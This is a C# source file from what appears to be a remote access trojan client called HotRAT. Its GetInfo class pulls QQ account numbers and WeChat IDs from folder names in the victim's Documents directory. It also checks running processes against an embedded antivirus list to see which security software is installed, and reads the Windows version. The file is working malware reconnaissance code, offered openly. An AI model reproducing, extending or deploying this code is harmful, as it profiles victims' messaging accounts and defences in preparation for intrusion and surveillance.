using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Reflection;
using System.Text;
using System.Text.Json;
using System.Text.RegularExpressions;
using System.Threading.Tasks;

namespace HotRAT.Client
{
    internal class GetInfo
    {
        public static string GetQQNumber()
        {
            bool IsValidQQNumber(string input, out long qq)
            {
                qq = 0;

                if (string.IsNullOrWhiteSpace(input) ||
                    input.Length < 5 ||
                    input.Length > 12 ||
                    !long.TryParse(input, out qq))
                {
                    return false;
                }

                if (input.StartsWith("0"))
                {
                    return false;
                }

                return true;
            }

            string tencentPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments), "Tencent Files");
            var qqList = new List<string>();
            if (Directory.Exists(tencentPath))
            {
                var subDirectories = Directory.GetDirectories(tencentPath);
                foreach (var dir in subDirectories)
                {
                    string dirName = Path.GetFileName(dir);

                    if (IsValidQQNumber(dirName, out long q))
                    {
                        qqList.Add(q.ToString());
                    }
                }
            }
            return string.Join("|", qqList);
        }
        public static string GetWxID()
        {
            Regex WxIdRegex = new Regex(
                @"^wxid_[a-zA-Z0-9_-]{5,28}$",
                RegexOptions.Compiled
            );
            bool ValidateWeChatId(string input)
            {
                if (input.Length < 10 || input.Length > 32 ||
                    !input.StartsWith("wxid_") ||
                    !WxIdRegex.IsMatch(input) ||
                    string.IsNullOrWhiteSpace(input) ||
                    input.Equals("wxid_admin", StringComparison.OrdinalIgnoreCase) ||
                    input.Equals("wxid_root", StringComparison.OrdinalIgnoreCase))
                    return false;

                return true;
            }
            string wxPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments), "xwechat_files");
            var wxList = new List<string>();
            if (Directory.Exists(wxPath))
            {
                var subDirectories = Directory.GetDirectories(wxPath);
                foreach (var dir in subDirectories)
                {
                    string dirName = Path.GetFileName(dir);

                    if (ValidateWeChatId(dirName))
                    {
                        wxList.Add(dirName.ToString());
                    }
                }
            }
            return string.Join("|", wxList);
        }


        public static string DetectA()
        {
            try
            {
                var processDict = JsonSerializer.Deserialize<Dictionary<string, string>>(ReadFile("Data.antiv.json"));
                foreach (var item in processDict)
                {
                    Console.WriteLine($"{item.Key}  {item.Value}");
                }
                var runningProcesses = Process.GetProcesses()
                    .Select(p => p.ProcessName.ToLower())
                    .ToHashSet();
                var detected = processDict
                    .Where(kv => runningProcesses.Contains(kv.Key.ToLower()))
                    .Select(kv => kv.Value)
                    .ToList();

                return detected.Count != 0 ? string.Join("|", detected) : "未检测到安全软件";
            }
            catch (Exception ex)
            {
                return $"检测失败: {ex.Message}";
            }
        }
        public static string Detect()
        {
            try
            {
                var processDict = JsonSerializer.Deserialize<Dictionary<string, string>>(ReadFile("Data.antiv.json"));
                var runningProcesses = Process.GetProcesses()
                    .Select(p => p.ProcessName.ToLower())
                    .ToHashSet();

                //Console.WriteLine("匹配检查：");
                var detected = new List<string>();
                foreach (var kv in processDict)
                {
                    bool isMatch = runningProcesses.Contains(kv.Key.ToLower());
                    //Console.WriteLine($"  {kv.Key.PadRight(20)} => {(isMatch ? "[√]" : "[ ]")}");
                    if (isMatch) detected.Add(kv.Value);
                }

                return detected.Count != 0 ? string.Join("|", detected) : "未检测到安全软件";
            }
            catch (Exception ex)
            {
                //Console.WriteLine($"[错误] {ex.Message}");
                return $"检测失败: {ex.Message}";
            }
        }

        public static string GetWindowsVersion()
        {
            var osVersion = Environment.OSVersion;
            string versionName = "Windows";
            using (var reg = Registry.LocalMachine.OpenSubKey(
                @"SOFTWARE\Microsoft\Windows NT\CurrentVersion"))
            {
                string productName = reg?.GetValue("ProductName")?.ToString() ?? "Windows";
                string displayVersion = reg?.GetValue("DisplayVersion")?.ToString() ?? "";
                return $"{productName} {displayVersion} (Build {osVersion.Version.Build})";
            }
        }

        public static string ReadFile(string file)
        {
            var assembly = Assembly.GetExecutingAssembly();
            var resourcePath = $"HotRAT.Client.{file}";

            using (var stream = assembly.GetManifestResourceStream(resourcePath))
            {
                if (stream == null)
                {
                    Console.WriteLine($"not found {file}.");
                    return "";
                }

                using (var reader = new StreamReader(stream, Encoding.UTF8))
                {
                    return reader.ReadToEnd();
                }
            }
        }
    }
}
